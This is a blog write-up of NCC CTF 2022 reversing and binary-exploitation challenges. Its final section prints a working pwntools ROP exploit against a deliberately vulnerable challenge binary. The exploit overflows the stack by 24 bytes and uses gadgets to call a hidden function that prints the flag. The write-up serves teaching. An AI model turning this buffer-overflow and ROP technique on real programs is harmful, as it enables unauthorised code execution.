<!DOCTYPE html>
<html lang="en" dir="auto" data-theme="dark">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>NCC CTF 2022 - Rev &amp; BinExp Challenges Writeup | New Horizonz</title>
<meta name="keywords" content="rev, binary, r2, radare2, rizin, reverse engineering, ghidra">
<meta name="description" content="Walkthrough of Reversing &amp; Binary Exploitation challenges presented at NED Cyber Community CTF 2022">
<meta name="author" content="Signore">
<link rel="canonical" href="https://signore.co.uk/posts/ncc-ctf-2022/">
<meta name="google-site-verification" content="tMHAv1yKyGLEQa4u4DMm_H9UwwX9FXyeMRCiIvg4vRc">
<link crossorigin="anonymous" href="/assets/css/stylesheet.b05de72c287a972e224354d8d25dd0970b1e5632dcb6ab6f544fe55c199896da.css" integrity="sha256-sF3nLCh6ly4iQ1TY0l3QlwseVjLctqtvVE/lXBmYlto=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://signore.co.uk/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://signore.co.uk/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://signore.co.uk/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://signore.co.uk/apple-touch-icon.png">
<link rel="mask-icon" href="https://signore.co.uk/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://signore.co.uk/posts/ncc-ctf-2022/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>

<script async src="https://www.googletagmanager.com/gtag/js?id=G-48LCDX0T0B"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-48LCDX0T0B');
</script>
<meta property="og:url" content="https://signore.co.uk/posts/ncc-ctf-2022/">
  <meta property="og:site_name" content="New Horizonz">
  <meta property="og:title" content="NCC CTF 2022 - Rev & BinExp Challenges Writeup">
  <meta property="og:description" content="Walkthrough of Reversing &amp; Binary Exploitation challenges presented at NED Cyber Community CTF 2022">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2022-07-20T00:00:00+00:00">
    <meta property="article:modified_time" content="2022-07-20T00:00:00+00:00">
    <meta property="article:tag" content="NCC CTF">
    <meta property="article:tag" content="Reversing">
    <meta property="article:tag" content="Rop">
    <meta property="og:image" content="https://signore.co.uk/images/cover-ncc-ctf-2022.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://signore.co.uk/images/cover-ncc-ctf-2022.png">
<meta name="twitter:title" content="NCC CTF 2022 - Rev &amp; BinExp Challenges Writeup">
<meta name="twitter:description" content="Walkthrough of Reversing &amp; Binary Exploitation challenges presented at NED Cyber Community CTF 2022">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://signore.co.uk/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "NCC CTF 2022 - Rev \u0026 BinExp Challenges Writeup",
      "item": "https://signore.co.uk/posts/ncc-ctf-2022/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "NCC CTF 2022 - Rev \u0026 BinExp Challenges Writeup",
  "name": "NCC CTF 2022 - Rev \u0026 BinExp Challenges Writeup",
  "description": "Walkthrough of Reversing \u0026amp; Binary Exploitation challenges presented at NED Cyber Community CTF 2022",
  "keywords": [
    "rev", "binary", "r2", "radare2", "rizin", "reverse engineering", "ghidra"
  ],
  "articleBody": "ðŸ’¡ Rizin is a fork of radare2, one of the most popular reverse engineering tools.\nReversing Warmup We run strings on the binary and get our flag:\nTerminal I later ran the binary, and it just gave the flag. Silly me! Terminal Can You C Me Running the binary asks us for correct password which we donâ€™t know yet.\nUpon opening the binary with rizin, we can see our flag right there but itâ€™s scattered. We can also see another string which resembles a password. Terminal Providing that password to the binary, we get our flag: Terminal Modulus Encryption The flag for the challenge has been encrypted using the encryption.py python script and the generated output is the output.txt file. Our goal is to decrypt the flag.\nThe script is taking input data as flag.txt. The encrypt function gets the unicode code of each character present in the file with ord() and adds some integers to it. Then, it converts the characters back to ASCII with chr(). Terminal We take the encrypted data output.txt as input. After getting the unicode, instead of adding, we modify the original technique a bit by subtracting the integers and then converting back to ASCII.\nUpon running the modified script, we get the flag. Terminal Make it Go! Running the binary asks us to enter password.\nOpening the challenge file in rizin, we seek to main function and disassemble it. Terminal Going a bit down, we can see the Enter_Password string which is later being printed in the console with a call to Fprint: Terminal Going futher down, we see there is the call to Fscanln which is taking user input. In the next instructions, thereâ€™s a string comparison being made and then there is the jne (jump if not equal) instruction from which we can deduce that thereâ€™s a condition being checked.\nWe can see that the user input is being compared to 0x45ea856. Terminal On providing the hex number to our binary, we get the flag: Terminal Pokemon Evolution ðŸ’¡ Here is a nice resource for ROP.\nWe are given challege files as pokemon_challenge.zip. The binary prints out some ASCII art and asks us for input Feed :\nWe open the challenge binary in cutter (GUI for rizin). I have the decompiler plugin installed, so we navigate to Decompiler tab.\nAlong main and register_name functions, we can see another function hacked. In the decompiled code, we can see that an if condition is checking the function arguments. We can also see the values against which the params are being compared. Letâ€™s keep note of these values.\nAfter trying random input lengths for quite a bit, the offset for RIP comes out to be 24. Terminal Now that we have RIP under control, we need to find the memory addresses of hacked funtion and ROP gadgets.\nAs we studied here, if the binary was 32-bit, we could have just pushed the function arguments onto the stack. But, as our binary is 64-bit and arguments are being accessed through registers, weâ€™ll take the help of ROP gadgets to achieve our goal.\nWe can find the memory address of the hacked function with gdb and ROP gadgets with ropper.\nTerminal Terminal Putting it all together, our final exploit script looks like this: VSCodium - exploit.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #!/usr/bin/python from pwn import * def start(argv=[], *a, **kw): if args.REMOTE: # ('server', 'port') return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw) exe = './pokemon_evolve' elf = context.binary = ELF(exe, checksec=False) padding=\"A\"*24 hacked_function_addr = 0x40119a pop_rdi = 0x401196 pop_rsi = 0x401198 payload = flat(padding, pop_rdi, 0xdeadbeefdeadbeef, pop_rsi, 0xc0debabec0debabe, hacked_function_addr) io = start() io.recvuntil(\"Feed :\") io.sendline(payload) io.interactive() On running the exploit, we successfully execute hacked function and bypass the conditional check by providing right arguments which, along with the beautiful dragon, returns the contents of flag.txt. Terminal Since I did the challenge really late, the remote server wasnâ€™t responding anymore and I could pwn the binary locally only.\nInitially, my exploit wasnâ€™t working and I was going mad about it.\nLater, @MoLover shared his exploit script with offset 24 while my exploit had 22. Thanks to him, as soon as I changed the offset of RIP in my exploit it, eventually, worked!\n",
  "wordCount" : "731",
  "inLanguage": "en",
  "image":"https://signore.co.uk/images/cover-ncc-ctf-2022.png","datePublished": "2022-07-20T00:00:00Z",
  "dateModified": "2022-07-20T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Signore"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://signore.co.uk/posts/ncc-ctf-2022/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "New Horizonz",
    "logo": {
      "@type": "ImageObject",
      "url": "https://signore.co.uk/favicon.ico"
    }
  }
}
</script>
</head>
<body id="top">
    <header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://signore.co.uk/" accesskey="h" title="home (Alt + H)">
                <img src="https://signore.co.uk/apple-touch-icon-grey.png" alt="" aria-label="logo"
                    height="28">home
            </a>
            <div class="logo-switches">
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://signore.co.uk/author/" title="About Me">
                    <span>About Me</span>
                </a>
            </li>
            <li>
                <a href="https://signore.co.uk/archives/" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="https://signore.co.uk/categories/" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://signore.co.uk/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="https://signore.co.uk/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://signore.co.uk/">Home</a>&nbsp;Â»&nbsp;<a href="https://signore.co.uk/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      NCC CTF 2022 - Rev &amp; BinExp Challenges Writeup
    </h1>
    <div class="post-meta"><span class="meta">
    <svg xmlns="http://www.w3.org/2000/svg" class="ionicon" width="12" height="12" fill="#7c7c7c" viewBox="0 0 512 512"><title>Calendar Clear</title><path d="M480 128a64 64 0 00-64-64h-16V48.45c0-8.61-6.62-16-15.23-16.43A16 16 0 00368 48v16H144V48.45c0-8.61-6.62-16-15.23-16.43A16 16 0 00112 48v16H96a64 64 0 00-64 64v12a4 4 0 004 4h440a4 4 0 004-4zM32 416a64 64 0 0064 64h320a64 64 0 0064-64V180a4 4 0 00-4-4H36a4 4 0 00-4 4z"/></svg> 
    <span>
        July 20, 2022
    </span>
    <span>&nbsp;&nbsp;</span>
</span><span class="meta">
    <svg xmlns="http://www.w3.org/2000/svg" class="ionicon" width="12" height="12" fill="#7c7c7c" viewBox="0 0 512 512"><title>Time</title><path d="M256 48C141.13 48 48 141.13 48 256s93.13 208 208 208 208-93.13 208-208S370.87 48 256 48zm96 240h-96a16 16 0 01-16-16V128a16 16 0 0132 0v128h80a16 16 0 010 32z"/></svg>
    <span>4 min</span>
    <span>&nbsp;</span>
</span>

</div>
  </header> <div class="toc">
    <details  open>
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#reversing-warmup">Reversing Warmup</a></li>
    <li><a href="#can-you-c-me">Can You C Me</a></li>
    <li><a href="#modulus-encryption">Modulus Encryption</a></li>
    <li><a href="#make-it-go">Make it Go!</a></li>
    <li><a href="#pokemon-evolution">Pokemon Evolution</a></li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><p>&#x1f4a1; Rizin is a fork of radare2, one of the most popular reverse engineering tools.</p>
<h2 id="reversing-warmup">Reversing Warmup<a hidden class="anchor" aria-hidden="true" href="#reversing-warmup">#</a></h2>
<p>We run <code>strings</code> on the binary and get our flag:</p>



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img loading="lazy" src="chall-1.png" alt=""  />
    </div>
</div>

<p>I later ran the binary, and it just gave the flag. Silly me!



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img loading="lazy" src="chall-11.png" alt=""  />
    </div>
</div>
</p>
<h2 id="can-you-c-me">Can You C Me<a hidden class="anchor" aria-hidden="true" href="#can-you-c-me">#</a></h2>
<p>Running the binary asks us for correct password which we don&rsquo;t know yet.</p>
<p>Upon opening the binary with rizin, we can see our flag right there but it&rsquo;s scattered. We can also see another string which resembles a password.



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img loading="lazy" src="chall-20.png" alt=""  />
    </div>
</div>
</p>
<p>Providing that password to the binary, we get our flag:



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img loading="lazy" src="chall-21.png" alt=""  />
    </div>
</div>
</p>
<h2 id="modulus-encryption">Modulus Encryption<a hidden class="anchor" aria-hidden="true" href="#modulus-encryption">#</a></h2>
<p>The flag for the challenge has been encrypted using the <code>encryption.py</code> python script and the generated output is the <code>output.txt</code> file. Our goal is to decrypt the flag.</p>
<p>The script is taking input data as <code>flag.txt</code>. The <code>encrypt</code> function gets the unicode code of each character present in the file with <code>ord()</code> and adds some integers to it. Then, it converts the characters back to ASCII with <code>chr()</code>.



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img loading="lazy" src="chall-30.png" alt=""  />
    </div>
</div>
</p>
<p>We take the encrypted data <code>output.txt</code> as input. After getting the unicode, instead of adding, we modify the original technique a bit by subtracting the integers and then converting back to ASCII.</p>
<p>Upon running the modified script, we get the flag.



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img loading="lazy" src="chall-31.png" alt=""  />
    </div>
</div>
</p>
<h2 id="make-it-go">Make it Go!<a hidden class="anchor" aria-hidden="true" href="#make-it-go">#</a></h2>
<p>Running the binary asks us to enter password.</p>
<p>Opening the challenge file in <code>rizin</code>, we <code>seek</code> to <code>main</code> function and disassemble it.



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img loading="lazy" src="chall-40.png" alt=""  />
    </div>
</div>
</p>
<p>Going a bit down, we can see the <code>Enter_Password</code> string which is later being printed in the console with a <code>call</code> to <code>Fprint</code>:



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img loading="lazy" src="chall-41.png" alt=""  />
    </div>
</div>
</p>
<p>Going futher down, we see there is the call to <code>Fscanln</code> which is taking user input. In the next instructions, there&rsquo;s a string comparison being made and then there is the <code>jne</code> (jump if not equal) instruction from which we can deduce that there&rsquo;s a condition being checked.</p>
<p>We can see that the user input is being compared to <code>0x45ea856</code>.



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img loading="lazy" src="chall-42.png" alt=""  />
    </div>
</div>
</p>
<p>On providing the hex number to our binary, we get the flag:



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img loading="lazy" src="chall-43.png" alt=""  />
    </div>
</div>
</p>
<h2 id="pokemon-evolution">Pokemon Evolution<a hidden class="anchor" aria-hidden="true" href="#pokemon-evolution">#</a></h2>
<p>&#x1f4a1; <a href="http://gauss.ececs.uc.edu/Courses/c6056/pdf/rop.pdf" target="_blank" rel="noopener noreferrer"  >
Here</a> is a nice resource for ROP.</p>
<p>We are given challege files as <code>pokemon_challenge.zip</code>. The binary prints out some ASCII art and asks us for input <code>Feed :</code></p>
<p>We open the challenge binary in <code>cutter</code> (GUI for rizin). I have the decompiler plugin installed, so we navigate to <code>Decompiler</code> tab.</p>
<p>Along <code>main</code> and <code>register_name</code> functions, we can see another function <code>hacked</code>. In the decompiled code, we can see that an <code>if</code> condition is checking the function arguments. We can also see the values against which the params are being compared. Let&rsquo;s keep note of these values.</p>
<p><img loading="lazy" src="chall-50-cutter.png" alt=""  />
</p>
<p>After trying random input lengths for quite a bit, the offset for RIP comes out to be <code>24</code>.



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img loading="lazy" src="chall-51.png" alt=""  />
    </div>
</div>
</p>
<p>Now that we have RIP under control, we need to find the memory addresses of <code>hacked</code> funtion and ROP gadgets.</p>
<p>As we studied <a href="https://signore.co.uk/blog/posts/pwn-0x00-warmup/#03-architectures-comparison" target="_blank" rel="noopener noreferrer"  >
here</a>, if the binary was 32-bit, we could have just pushed the function arguments onto the stack. But, as our binary is 64-bit and arguments are being accessed through <code>registers</code>, we&rsquo;ll take the help of ROP gadgets to achieve our goal.</p>
<p>We can find the memory address of the <code>hacked</code> function with gdb and ROP gadgets with <code>ropper</code>.</p>
<p>


<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img loading="lazy" src="chall-52-0.png" alt=""  />
    </div>
</div>




<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img loading="lazy" src="chall-52-1.png" alt=""  />
    </div>
</div>
</p>
<p>Putting it all together, our final exploit script looks like this:



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">VSCodium - exploit.py</div>
    </div>
    <div class="terminalbody">
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>  <span class="c1"># (&#39;server&#39;, &#39;port&#39;)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>  <span class="c1"># Run locally</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="s1">&#39;./pokemon_evolve&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">padding</span><span class="o">=</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">24</span>
</span></span><span class="line"><span class="cl"><span class="n">hacked_function_addr</span> <span class="o">=</span> <span class="mh">0x40119a</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x401196</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rsi</span> <span class="o">=</span> <span class="mh">0x401198</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">padding</span><span class="p">,</span> <span class="n">pop_rdi</span><span class="p">,</span> <span class="mh">0xdeadbeefdeadbeef</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">pop_rsi</span><span class="p">,</span> <span class="mh">0xc0debabec0debabe</span><span class="p">,</span> <span class="n">hacked_function_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Feed :&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>
</p>
<p>On running the exploit, we successfully execute <code>hacked</code> function and bypass the conditional check by providing right arguments which, along with the beautiful dragon, returns the contents of <code>flag.txt</code>.



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img loading="lazy" src="chall-53.png" alt=""  />

<img loading="lazy" src="chall-54.png" alt=""  />
    </div>
</div>
</p>
<p>Since I did the challenge really late, the remote server wasn&rsquo;t responding anymore and I could pwn the binary locally only.</p>
<p>Initially, my exploit wasn&rsquo;t working and I was going mad about it.<br>
Later, @MoLover shared his exploit script with offset <code>24</code> while my exploit had <code>22</code>. Thanks to him, as soon as I changed the offset of RIP in my exploit it, eventually, worked!</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://signore.co.uk/tags/ncc-ctf/">NCC CTF</a></li>
      <li><a href="https://signore.co.uk/tags/reversing/">Reversing</a></li>
      <li><a href="https://signore.co.uk/tags/rop/">Rop</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="https://signore.co.uk/posts/pwn-0x02-nx-bypass/">
    <span class="title">Â« Prev</span>
    <br>
    <span>Pwn 0x02: NX Bypass</span>
  </a>
  <a class="next" href="https://signore.co.uk/posts/pwn-0x01-buffer-overflow/">
    <span class="title">Next Â»</span>
    <br>
    <span>Pwn 0x01: Buffer Overflow</span>
  </a>
</nav>


<ul class="share-buttons">
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share NCC CTF 2022 - Rev & BinExp Challenges Writeup on x"
            title="share on X"
            href="https://x.com/intent/tweet/?text=NCC%20CTF%202022%20-%20Rev%20%26%20BinExp%20Challenges%20Writeup&amp;url=https%3a%2f%2fsignore.co.uk%2fposts%2fncc-ctf-2022%2f&amp;hashtags=NCCCTF%2creversing%2crop">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M 469.33334,94.794994 V 417.20514 c 0,28.76996 -23.35824,52.1282 -52.1282,52.1282 H 94.794994 c -28.769985,0 -52.128327,-23.35824 -52.128327,-52.1282 V 94.794994 c 0,-28.769985 23.357511,-52.128327 52.128327,-52.128327 H 417.20514 c 28.77059,0 52.1282,23.358342 52.1282,52.128327 z M 267.62578,201.62494 194.8058,105.34667 H 89.333335 L 215.34659,270.12486 95.916664,406.65254 h 51.138346 l 92.19507,-105.33342 80.55579,105.33342 h 102.8608 L 291.30578,232.97245 402.97246,105.34667 h -51.11153 z m -118.59827,-67.2916 h 30.38999 l 182.8166,241.7208 h -28.31744 z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share NCC CTF 2022 - Rev & BinExp Challenges Writeup on linkedin"
            title="share on Linkedin"
            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsignore.co.uk%2fposts%2fncc-ctf-2022%2f&amp;title=NCC%20CTF%202022%20-%20Rev%20%26%20BinExp%20Challenges%20Writeup&amp;summary=NCC%20CTF%202022%20-%20Rev%20%26%20BinExp%20Challenges%20Writeup&amp;source=https%3a%2f%2fsignore.co.uk%2fposts%2fncc-ctf-2022%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M417.2 64H96.8C79.3 64 64 76.6 64 93.9V415c0 17.4 15.3 32.9 32.8 32.9h320.3c17.6 0 30.8-15.6 30.8-32.9V93.9C448 76.6 434.7 64 417.2 64zM183 384h-55V213h55v171zm-25.6-197h-.4c-17.6 0-29-13.1-29-29.5 0-16.7 11.7-29.5 29.7-29.5s29 12.7 29.4 29.5c0 16.4-11.4 29.5-29.7 29.5zM384 384h-55v-93.5c0-22.4-8-37.7-27.9-37.7-15.2 0-24.2 10.3-28.2 20.3-1.5 3.6-1.9 8.5-1.9 13.5V384h-55V213h55v23.8c8-11.4 20.5-27.8 49.6-27.8 36.1 0 63.4 23.8 63.4 75.1V384z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share NCC CTF 2022 - Rev & BinExp Challenges Writeup on facebook"
            title="share on Facebook"
            href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fsignore.co.uk%2fposts%2fncc-ctf-2022%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M426.8 64H85.2C73.5 64 64 73.5 64 85.2v341.6c0 11.7 9.5 21.2 21.2 21.2H256V296h-45.9v-56H256v-41.4c0-49.6 34.4-76.6 78.7-76.6 21.2 0 44 1.6 49.3 2.3v51.8h-35.3c-24.1 0-28.7 11.4-28.7 28.2V240h57.4l-7.5 56H320v152h106.8c11.7 0 21.2-9.5 21.2-21.2V85.2c0-11.7-9.5-21.2-21.2-21.2z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share NCC CTF 2022 - Rev & BinExp Challenges Writeup on whatsapp"
            title="share on Whatsapp"
            href="https://api.whatsapp.com/send?text=NCC%20CTF%202022%20-%20Rev%20%26%20BinExp%20Challenges%20Writeup%20-%20https%3a%2f%2fsignore.co.uk%2fposts%2fncc-ctf-2022%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M260.062 32C138.605 32 40.134 129.701 40.134 250.232c0 41.23 11.532 79.79 31.559 112.687L32 480l121.764-38.682c31.508 17.285 67.745 27.146 106.298 27.146C381.535 468.464 480 370.749 480 250.232 480 129.701 381.535 32 260.062 32zm109.362 301.11c-5.174 12.827-28.574 24.533-38.899 25.072-10.314.547-10.608 7.994-66.84-16.434-56.225-24.434-90.052-83.844-92.719-87.67-2.669-3.812-21.78-31.047-20.749-58.455 1.038-27.413 16.047-40.346 21.404-45.725 5.351-5.387 11.486-6.352 15.232-6.413 4.428-.072 7.296-.132 10.573-.011 3.274.124 8.192-.685 12.45 10.639 4.256 11.323 14.443 39.153 15.746 41.989 1.302 2.839 2.108 6.126.102 9.771-2.012 3.653-3.042 5.935-5.961 9.083-2.935 3.148-6.174 7.042-8.792 9.449-2.92 2.665-5.97 5.572-2.9 11.269 3.068 5.693 13.653 24.356 29.779 39.736 20.725 19.771 38.598 26.329 44.098 29.317 5.515 3.004 8.806 2.67 12.226-.929 3.404-3.599 14.639-15.746 18.596-21.169 3.955-5.438 7.661-4.373 12.742-2.329 5.078 2.052 32.157 16.556 37.673 19.551 5.51 2.989 9.193 4.529 10.51 6.9 1.317 2.38.901 13.531-4.271 26.359z" />
            </svg>
        </a>
    </li>
</ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://signore.co.uk/">New Horizonz</a></span> Â· 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>
